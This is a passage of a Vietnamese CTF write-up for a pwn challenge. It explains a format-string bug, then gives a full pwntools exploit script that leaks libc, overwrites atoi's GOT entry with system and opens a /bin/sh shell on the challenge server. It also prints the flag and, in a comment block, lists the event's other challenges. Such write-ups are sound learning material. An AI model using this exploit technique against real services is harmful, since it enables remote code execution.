Nhập duy nhất một chữ số unsigned int, nghĩa là chỉ được nhập trong khoảng [0, 9]. Vì vậy, việc `choice = 68` là bất khả thi. Có 2 điều chúng ta cần quan tâm ở đây đó là: 
1. Nếu nhập input không đúng với fmt của hàm `scanf` thì `choice` sẽ không bị thay đổi giá trị. 
2. Đứng ở góc độ hàm `main` nhìn xuống, giá trị `choice` trong hàm `game` nằm ở vị trí `rbp-0xC`, đây cũng chính là địa chỉ chứa giá trị random của hàm `get_random_number`. 

Tới đây thì ý tưởng đã rõ. Chúng ta sẽ spam mãi cho tới khi lấy được lucky number = 68. Tiếp tục nhập `choice` với `-` để sử dụng được bug FMT nhiều lần. 

Bên cạnh đó, nhìn vào hàm `get_int_number` sẽ thấy nó cho phép nhập vào mảng `buf`. Ta sẽ overwrite `atoi@got` thành `system`, khi đó `atoi("/bin/sh")` sẽ là `system("/bin/sh")`. 

```c
int get_int_number()
{
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  read(0, buf, 0xFuLL);
  return atoi(buf);
}
```

Full exploit 
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal") 
libc = ELF("//usr/lib/x86_64-linux-gnu/libc.so.6")
# ld = ELF("./ld-2.35.so")

context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)

def debug():
    gdb.attach(p, gdbscript = """
        b* 0x40157A
        continue
    """)
    pause() 

# debug()

while True: 
    # p = process(exe.path)
    p = remote("152.69.210.130", 2004)

    sl  = p.sendline
    sa  = p.sendafter
    sla = p.sendlineafter
    rl  = p.recvline
    ru  = p.recvuntil

    ru(b"Lucky number: ")
    lucky_number = int(rl().strip(), 10)

    if lucky_number == 68: 
        break  
    else: 
        p.close() 

sl(b"-")
payload = b"%67$p"
sla(b"name: ", payload) 

libc_leak = int(rl().strip(), 16)
libc_base = libc_leak - libc.symbols["__libc_start_main"] - 128 
system = libc_base + libc.symbols["system"]

log.info(f"libc base = {hex(libc_base)}")
log.info(f"libc leak = {hex(libc_leak)}")
log.info(f"system = {hex(system)}")

package = {
    (system >> 0 ) & 0xFFFF : exe.got["atoi"],
    (system >> 16) & 0xFFFF : exe.got["atoi"] + 2, 
    (system >> 32) & 0xFFFF : exe.got["atoi"] + 4 
}
sorted_package = sorted(package) 

payload =  f"%{sorted_package[0]}c%12$hn".encode() 
payload += f"%{sorted_package[1] - sorted_package[0]}c%13$hn".encode() 
payload += f"%{sorted_package[2] - sorted_package[1]}c%14$hn".encode() 
payload = payload.ljust(0x30, b"P") 
payload += flat(
    package[sorted_package[0]],
    package[sorted_package[1]],
    package[sorted_package[2]]
)

sl(b"-") 
sla(b"name: ", payload) 

sl(b"1")
sla(b"guess: ", b"/bin/sh")

p.interactive() 
```
Flag thu được là `ISITDTU{a0e1948f76e189794b7377d8e3b585bfa99d7ed0de7e6a6ff01c2fd95bdf3f72}`. 






















<!--
# List challenges

rev/2much

{{< admonition note "Challenge Information" >}}
* 9 solves / 463 pts / by kinjazz
* **Given files:** [2much](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EXwT132DY0NPk7OxgMuDi0MBx2yC4T2EOka5eeCVUI-I4Q?e=YVdBO4)
{{< /admonition >}}

rev/FlagCpp

{{< admonition note "Challenge Information" >}}
* 6 solves / 486 pts / by ks75vl
* **Given files:** [FlagCpp_5C9F861EFCC1AFF273C435E3CC988438.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EVxUcWswr9dDpgp6dliEmegBuIlCMyD9yrrI2shOlmwArw?e=mwWGaf)
* **Description:** Trust me, this program was written in `C++`.
{{< /admonition >}}

pwn/no_name

{{< admonition note "Challenge Information" >}}
* 29 solves / 100 pts
* **Given files:** [no_name.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EW0yP2v46lVGi3xRUj9hG-IBg1zvlXp0MAoFnybPawQs0g?e=k44Cdw)
* **Description:** `nc 152.69.210.130 1337`
{{< /admonition >}}

forensics/CPUsage

{{< admonition note "Challenge Information" >}}
* 37 solves / 100 pts / by M4shl3
* **Given files:** [https://drive.proton.me/urls/5MM9NY7SZW#O3lmkiJIBJzr](https://drive.proton.me/urls/5MM9NY7SZW#O3lmkiJIBJzr)
* **Description:** My friend noticed a high usage of CPU after he opened his laptop, I just take a memory dump of his laptop, and needs you to investigate it. Q1- What is the name of the malicious process, full path of the process, parent process id? Q2- what is the ip that process communicate with, family name of the malware\
Format flag: `ISITDTU{processName-FullPath-ID_ip-FamilyName}` \
Eg: `ISITDTU{Spotify.exe-Path-141_192.168.1.1-isitdtu}`
{{< /admonition >}}

forensics/Corrupted Hard Drive

{{< admonition note "Challenge Information" >}}
* 46 solves / 100 pts / by M4shl3 x vizer
* **Given files:** [https://drive.proton.me/urls/15NQK5V8B0#VAesxikOWzxP](https://drive.proton.me/urls/15NQK5V8B0#VAesxikOWzxP)
* **Description:** You’ve come across a damaged disk image retrieved from my friend's laptop, he downloaded some good stuff then went to bathroom, but when came, he found that he can't access the disk. The file system appears to be corrupted, but hidden deep inside the broken structure lies critical information that could unlock the next step in your investigation.\
`nc 152.69.210.130 1411`
{{< /admonition >}}

forensics/unexpected

{{< admonition note "Challenge Information" >}}
* 17 solves / 349 pts / by 3r3m1t1c
* **Given files:** [chall](https://drive.google.com/file/d/1_pfVtaS1oMeiWd9dgqLP97yiLfD60Sih/view)
* **Description:** Aquanman Investigation Company is currently recruiting for the role of Digital Forensics Investigator. As part of the application process, candidates are required to complete a challenge designed to assess their skills in digital forensics. Applicants will need to investigate a simulated attack, analyze the provided evidence, and submit the flag.\
The flag is divided into three different parts!
{{< /admonition >}}

forensics/swatted

{{< admonition note "Challenge Information" >}}
* 15 solves / 385 pts / by 3r3m1t1c
* **Given files:** [source](https://drive.google.com/file/d/15fdpvHGRI94QGzUZ61CYX2rVbKGAYDVU/view)
* **Description:** San Andreas PD recently conducted a raid on a suspect's residence, discovering that their laptop contains crucial evidence. As a Digital Forensics Investigator, it is now your responsibility to analyze the evidence and answer the related questions.\
`nc 152.69.210.130 1259`
{{< /admonition >}}

forensics/Initial

{{< admonition note "Challenge Information" >}}
* 10 solves / 453 pts / by M4shl3
* **Given files:** [https://drive.proton.me/urls/ZYS0NTACTC#2E4aPfRdGZum](https://drive.proton.me/urls/ZYS0NTACTC#2E4aPfRdGZum)
* **Description:** A Windows environment has been compromised .The attacker used a known feature in windows which served as the initial vector of the attack. Your task is to investigate & SEARCH how the attacker get the initial access.
{{< /admonition >}}

web/Another one

{{< admonition note "Challenge Information" >}}
* 103 solves / 100 pts / by khanhhnahk1
* **Given files:** [Another_one_dist.zip](https://ctf.isitdtu.com/files/4e936e9c5732e01b42eea36e1dc838f5/Another_one_dist.zip?token=eyJ1c2VyX2lkIjoyMzUwLCJ0ZWFtX2lkIjoxNDAyLCJmaWxlX2lkIjo2MH0.Zx6EFA.FTrsquEeeKuzC1Co3hVQxJga6tQ)
* **Description:** Tell them bring out the lobster :point_up: \
Please test locally before testing on remote.\
[http://152.69.210.130:5000](http://152.69.210.130:5000/) / [http://20.198.254.169:5000](http://20.198.254.169:5000/)
{{< /admonition >}}

web/X Éc Éc

{{< admonition note "Challenge Information" >}}
* 63 solves / 100 pts / by onrsa
* **Description:** `"dependencies":  {"dompurify": "^3.1.6"}`\
Warm up liu tiu riu :v\
Chall: [http://152.69.210.130](http://152.69.210.130/)\
Bot: [http://152.69.210.130:81/report](http://152.69.210.130:81/report/)
{{< /admonition >}}

web/S1mple

{{< admonition note "Challenge Information" >}}
* 35 solves / 100 pts / by 0x90
* **Given files:** [Dockerfile](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/ERWi6qwus71Hrb1yXBBg8kQBsaYhHrvyk9CHbIHzJW2hSg?e=mbHb8t)
* **Description:** Just a simple HTTP Server\
  [http://35.240.202.218:8000](http://35.240.202.218:8000/)
{{< /admonition >}}

web/hihi

{{< admonition note "Challenge Information" >}}
* 20 solves / 287 pts / by khanhhnahk1
* **Given files:** [src](https://drive.google.com/file/d/13p2eQemGAHZm35g1040T8Yo_rp26x8Sq/view)
* **Description:** 🤭🤭\
  Chall: [http://213.35.127.196:8083](http://213.35.127.196:8083/)
{{< /admonition >}}

web/niceray

{{< admonition note "Challenge Information" >}}
* 17 solves / 349 pts / by Onsra x Deku
* **Given files:** [src](https://drive.google.com/file/d/1mTkXeAxAPmEGcwwjylxlZ7Xlni9Hw99o/view)
* **Description:** Niceray or Nineray or Liferay :)))\
  Please test locally before testing on remote. Any team that has captured the flag on the local instance, please DM the two authors below or create a ticket, and we will open an instance for you to capture the flag remotely. The instance creation link will be updated soon (since we're getting a high-RAM VPS to support this challenge :v )\
**Hint**: Due to a configuration, teams can still exploit the 
endpoint `/api/jsonws/invoke` locally, but it won’t be exploitable remotely.
{{< /admonition >}}

web/Hero

{{< admonition note "Challenge Information" >}}
* 5 solves / 491 pts / by taidh
* **Description:** I'm too busy with work to create a hard challenge, so here is an easy one. Enjoy and get free points from it!\
Link challenge: [http://213.35.127.196:63432](http://213.35.127.196:63432/)
{{< /admonition >}}

web/Geo Weapon

{{< admonition note "Challenge Information" >}}
* 0 solve / 1000 pts / by pew
* **Given files:** [dist.zip](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EdqO5-j3f-lBp-aqVaOtPo4BgAEaSD_LSQPO_n7bZo8egg?e=AeuMJa)
* **Description:** Little weapon, little weapon, little weapon We're calling you There's a war, if the guns are just to tall for you. We'll find you something small to use Little weapon, little weapon, little weapon. We need you now, blaow!\
By: Pew (This challenge expects you to find a 0day. If one is found pls report it yourself to the respected party.) Please test locally before testing on remote, ips that abuse instance will be blocked !!!\
`nc 213.35.127.196 4444`
{{< /admonition >}}

crypto/ShareMixer1

{{< admonition note "Challenge Information" >}}
* 42 solves / 100 pts / by catto
* **Given files:** [chall.py](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EfTJ2V_UgjVIh5AsYtjUPw0Bk5IdW6sE9E4pQJYQnu--oA?e=UGsPhP)
* **Description:** Let's mix some shares!!!!!!!!!!!!!!!!!!!!!!!!!\
  `nc 35.187.238.100 5001`
{{< /admonition >}}

crypto/ShareMixer2

{{< admonition note "Challenge Information" >}}
* 32 solves / 100 pts / by catto
* **Given files:** [chall.py](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EYF7MSXSFBZNmPZqMEj8SfwB9Rc3OWf7rGZEUjQXM4wZjA?e=kVIMCM)
* **Description:** Let's mix some shares!!!!!!!!!!!!!!!!!!!!!!!!! Again :>\
  `nc 35.187.238.100 5002`
{{< /admonition >}}

crypto/Sign

{{< admonition note "Challenge Information" >}}
* 23 solves / 214 pts / by m1dm4n
* **Given files:** [chall.py](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/EWpihqOcqqFBpCr-__BVLSQBEBOqoCsR9OgPkuWTZ5hssA?e=Ej4Y3H)
* **Description:** I love giving out signatures :"> As long as my modulus are hidden, you can't know what I'm signing!\
`nc 35.187.238.100 5003`
{{< /admonition >}}

crypto/thats so random

{{< admonition note "Challenge Information" >}}
* 9 solves / 463 pts
* **Given files:** 
  * [chall.py](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/Eaxf7qc0U4BAlcaGXrAIhxkB6VTsPM_z0DtWsDacscqKyg?e=i1ezT3)
  * [output.txt](https://wru-my.sharepoint.com/:t:/g/personal/2251272678_e_tlu_edu_vn/EQRcIQxYSudKo4VOxpQH5zoB9E_ENGlBwYcZe1q3Yrwmzg?e=gFfsOq)
{{< /admonition >}}

crypto/somesomesome

{{< admonition note "Challenge Information" >}}
* 6 solves / 486 pts
* **Given files:** [somesomesome.py](https://wru-my.sharepoint.com/:u:/g/personal/2251272678_e_tlu_edu_vn/ERjCy2wKIjRLkClEsno1y6UBs63svCe4KFjY51KXuvmUYA?e=5wwLXg)
{{< /admonition >}} -->
